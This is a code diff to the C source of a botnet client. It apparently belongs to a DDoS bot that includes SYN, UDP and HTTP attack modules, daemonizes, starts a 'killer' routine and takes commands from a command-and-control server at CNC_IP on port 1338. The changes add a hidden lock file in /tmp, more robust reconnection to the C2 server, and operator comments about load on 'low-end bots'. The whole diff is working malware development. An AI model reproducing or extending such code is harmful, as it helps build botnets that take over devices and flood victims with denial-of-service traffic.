@@ -9,6 +9,8 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <time.h>
+#include <sys/file.h>
+#include <errno.h>
 #include "headers/syn_attack.h"
 #include "headers/udp_attack.h"
 #include "headers/http_attack.h"
@@ -23,8 +25,12 @@
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
-#define MAX_THREADS 2 
-// recommended 2-5
+#define MAX_THREADS 2
+// recommended 2-5 (OR 1 IF LOADING LOW-END bots)
+// dont increase this too much, save resources plz
+// dont exhaust bots forever, your cnc may die sometime..
+#define MAX_RECONNECT_ATTEMPTS 8
+#define RETRY_DELAY 4 // increase this if your port speed is low 
 
 const char* get_arch() {
     #ifdef ARCH_aarch64
@@ -159,6 +165,17 @@ int main(int argc, char** argv) {
     static char command[1024];
     ssize_t n;
     
+    // lock file to save resources and not spam conns because of daemon
+    int lock_fd = open("/tmp/.bot_lock", O_CREAT | O_RDWR, 0600);
+    if (lock_fd < 0) {
+        exit(1);
+    }
+
+    if (flock(lock_fd, LOCK_EX | LOCK_NB) < 0) {
+        close(lock_fd);
+        exit(0);
+    }
+
     daemonize(argc, argv);
     start_killer();
 
@@ -166,23 +183,36 @@ int main(int argc, char** argv) {
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
 
-    int attempts = 0;
-    while (attempts < 15) {
+    int connect_attempts = 0;
+    int initial_connection = 1;
+
+    while (connect_attempts < MAX_RECONNECT_ATTEMPTS) {
+        if (sock != -1) {
+            close(sock);
+            sock = -1;
+        }
+
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0) {
-            sleep(1);
-            attempts++;
+            connect_attempts++;
+            sleep(RETRY_DELAY);
             continue;
         }
 
         if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
             close(sock);
-            sleep(5);
-            attempts++;
+            sock = -1;
+            connect_attempts++;
+            sleep(RETRY_DELAY);
             continue;
         }
 
-        send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL);
+        // successfully connected
+        if (initial_connection) {
+            send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL);
+            initial_connection = 0;
+            connect_attempts = 0; 
+        }
 
         while ((n = recv(sock, command, sizeof(command)-1, 0)) > 0) {
             command[n] = 0;
@@ -190,10 +220,20 @@ int main(int argc, char** argv) {
             memset(command, 0, sizeof(command));
         }
 
-        close(sock);
-        sock = -1;
-        sleep(1);
+        // connection lost, begin retries again
+        if (!initial_connection) {
+            connect_attempts++;
+        }
+        sleep(RETRY_DELAY);
     }
+
+    // die
+    if (sock != -1) {
+        close(sock);
+    }
+    flock(lock_fd, LOCK_UN);
+    close(lock_fd);
+    unlink("/tmp/.bot_lock");
 
     return 0;
 }
